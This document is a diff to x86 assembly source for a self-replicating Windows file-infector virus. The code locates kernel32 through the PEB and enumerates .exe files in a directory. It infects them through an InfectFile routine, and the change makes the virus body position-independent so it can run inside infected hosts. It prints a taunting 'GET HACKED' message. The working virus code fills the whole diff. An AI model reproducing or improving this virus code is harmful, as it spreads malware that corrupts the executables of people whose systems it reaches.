@@ -1,15 +1,14 @@
 %include "io.inc"
 %include "./common.inc"
 
-%define DEBUG               1
+%define DEBUG               0
 
 virusLen equ	            end - start
 
 global _main
 
 section .data
-    ; debug data
-    counter                 dd 1
+    EIP                     dd 0
 
     ; kernel data
     kernelAddress           dd 0
@@ -40,9 +39,7 @@ section .data
     SetEndOfFile            dd 0
 
     ; directory listing data
-    directory               db "C:\Assembly\Dummies\", 0
-    exestr                  db "*.exe", 0
-    search times 592        db 41h
+    search times 592        db 0
     
     ; infection data
     fileAlign               dd 0
@@ -67,18 +64,20 @@ section .data
     virusAddress            dd 0
     virusLocation           dd 0
 
-    ; payload data
-    overlapped              istruc OVERLAPPED
-        at offset,          dd 0xFFFFFFFF
-        at offsetHigh,      dd 0xFFFFFFFF
-    iend
+    ; debug data
+    counter                 dd 1
 
 
 section .text
 start:
 _main:
     mov ebp, esp; for correct debugging
+    
 
+    call getEIP
+anchor:
+    mov [EIP], eax
+    
     ; Figure out kernel32.dll's location
     mov edi, [FS : 0x30]    ; PEB
     mov edi, [edi + 0x0C]   ; PEB->Ldr
@@ -248,7 +247,8 @@ discard:
     ; Now we begin with the business of infecting some files
 
     ; SetCurrentDirectory
-    lea     ebx, [directory]
+    mov     ebx, [EIP]
+    add     ebx, directory - anchor
     push    ebx
     call    [SetCurrentDirectoryA]
  
@@ -256,7 +256,8 @@ discard:
     ; find first file
     lea     ebx, [search]
     push    ebx                ; Push the address of the search record
-    mov     ebx, exestr        ; Point to file mask
+    mov     ebx, [EIP]         ; Compute pointer to file mask
+    add     ebx, exestr - anchor
     push    ebx                ; Push the address of file mask
     call    [FindFirstFileA]
     cmp     eax, -1
@@ -285,30 +286,31 @@ done:
     ; hStdOut = GetstdHandle(STD_OUTPUT_HANDLE)
     push    -11
     call    [GetStdHandle]
+    mov     edx, eax
 
     ; WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, lpOverlapped);
-    push    overlapped                    ; lpOverlapped
+    ;mov     eax, [EIP]
+    ;add     eax, overlapped - anchor
+    ;push    eax
+;    push    overlapped              ; lpOverlapped
+; TODO - make this overlapped shit work
+    push    NULL
     push    NULL                    ; &lpNumberOfBytesWritten
     push    message_end - message   ; nNumberOfBytesToWrite
-    call    foo
-foo:
-    pop     ebx
-    add     ebx, message - foo
-    push    ebx                     ; lpBuffer
-    push    eax                     ; hFile
+    mov     eax, [EIP]
+    add     eax, message - anchor
+    push    eax                     ; lpBuffer
+    push    edx                     ; hFile
     call    [WriteFile]
 
-    jmp     exit   
-    
-    message:       db 'Im a virus, motherfucker!', 10, 'GET HACKED!!!', 10
-    message_end:      
-    
 exit:     
     ; ExitProcess(0)
     push    0
     call    [ExitProcess]
 
-
+getEIP:
+    mov eax, [esp]
+    retn
 
 ;; HELPER FUNCTIONS
 
@@ -318,7 +320,7 @@ InfectFile:
 ;;    - esi = filename                               ;;
 ;;    - ecx = filesize                               ;;
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
-    pushad								; Save all registers
+    pushad								   ; Save all registers
  
     mov	  [newFileSize], ecx          ; Save file size
     mov     ebx, 0
@@ -333,7 +335,7 @@ InfectFile:
     mov	  [fileOffset], esi				; ESI = pointer to filename ***
     lea     ebx, [search + 44] 
     push	  ebx                         ; Address to filename
-    call    [GetFileAttributesA]                         ; Get the file attributes
+    call    [GetFileAttributesA]        ; Get the file attributes
     cmp	  eax, 0
     mov	  [fileAttributes], eax		
     
@@ -733,5 +735,16 @@ OutOfHere:
     PRINT_TRACE
     
     retn
+    
+    
+    message:                db 'Im a virus, motherfucker!', 10, 'GET HACKED!!!', 10
+    message_end:      
+    directory:              db "C:\Assembly\Dummies\", 0
+    exestr:                 db "*.exe", 0
+    overlapped:             istruc OVERLAPPED
+        at offset,          dd 0xFFFFFFFF
+        at offsetHigh,      dd 0xFFFFFFFF
+    iend
+
 
 end:
